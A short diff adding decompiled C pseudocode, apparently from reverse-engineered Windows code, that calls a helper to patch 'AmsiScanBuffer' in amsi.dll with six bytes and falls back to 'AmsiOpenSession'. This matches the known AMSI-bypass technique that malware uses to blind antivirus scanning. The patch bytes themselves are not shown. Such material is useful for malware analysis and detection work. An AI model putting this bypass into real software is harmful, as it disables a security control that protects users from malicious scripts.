@@ -1,0 +1,8 @@
+{
+  __int64 result; // rax
+
+  result = sub_1400041A0("amsi.dll", "AmsiScanBuffer", &unk_140005120, 6u);
+  if ( !(_DWORD)result )
+    return sub_1400041A0("amsi.dll", "AmsiOpenSession", &unk_140005120, 6u);
+  return result;
+}
